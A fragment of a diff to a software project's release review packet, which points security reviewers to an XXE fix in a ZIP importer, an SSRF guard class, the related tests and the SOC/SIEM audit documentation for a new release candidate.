+  SAXReader configuration. Doesn't go through Tomcat / Jersey.
+- `REVIEW_PACKET.md`, `RELEASE_NOTES.md`, `CLAUDE.md`
+  (RC6.11 section).
+
+Security-focused reviewers can scope to the 11-line diff in
+`ZipImporter.java`. The audit table in §2.A documents every
+other XML parser sink in the codebase and shows each is already
+hardened. The full live PoC sequence is documented in §2.A
+"Live PoC reproduction + post-fix verification".
+
+---
+
+If you reviewed RC6.9 already, the older RC6.10 delta is also
+worth a quick glance:
 
 ```bash
 git diff v3.1.1-RC6.9..v3.1.1-RC6.10
 ```
 
-Focused set (refactor + tooling — no new SSRF closure):
+Focused set (RC6.10 refactor + tooling — no new SSRF closure):
 
 - **NEW** `core/src/main/java/jp/aegif/nemaki/security/SsrfGuard.java`
   (~263 lines, new file, new package) — the extracted classifier.
@@ -1219,12 +1484,12 @@ cumulative diff (since `v3.1.1-RC4.1`) in §1.
 | Purpose | File |
 |---|---|
 | Re-send overview (this file) | `REVIEW_PACKET.md` |
-| What changed and why (per RC) | `RELEASE_NOTES.md` (18 sections RC5 → RC6.10) |
+| What changed and why (per RC) | `RELEASE_NOTES.md` (19 sections RC5 → RC6.11) |
 | Design rationale | `docs/design/connector-delegation.md` (§12.1 - §12.20) |
 | Multi-replica operational notes | `docs/MULTI-REPLICA-DEPLOYMENT.md` |
 | Project-internal navigation (Japanese) | `CLAUDE.md` |
 | API entry points | `ConnectorDefinitionController.java`, `ImportProfileDefinitionController.java`, `IngestSchedulerService.java`, `AuditEmitSupport.java` |
-| Test coverage proof | `core/src/test/java/jp/aegif/nemaki/rest/ingest/*Test.java` + `core/src/test/java/jp/aegif/nemaki/security/SsrfGuardTest.java` + `core/src/test/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcherTest.java` (373 PASS across 24 focused classes at RC6.10) |
+| Test coverage proof | `core/src/test/java/jp/aegif/nemaki/rest/ingest/*Test.java` + `core/src/test/java/jp/aegif/nemaki/security/SsrfGuardTest.java` + `core/src/test/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcherTest.java` + `core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java` (377 PASS across 25 focused classes at RC6.11) |
 | SOC / SIEM audit integration (playbook) | `docs/SOC-AUDIT-INTEGRATION.md` |
 | SOC / SIEM audit integration (import-ready templates, operator validation required) | `docs/soc-templates/` (README + Filebeat / Fluent Bit / Vector shippers + Kibana Detection Engine NDJSON / Loki Ruler / Splunk savedsearches rule sets — see README "Template validation status" table for the per-template syntax-only / no-live-test gap) |
 | Connector-area manual verification (RC6.5) | `docs/MANUAL-VERIFICATION-CONNECTORS.md` (1300+ lines step-by-step curl + UI, 3-round live-verified) |
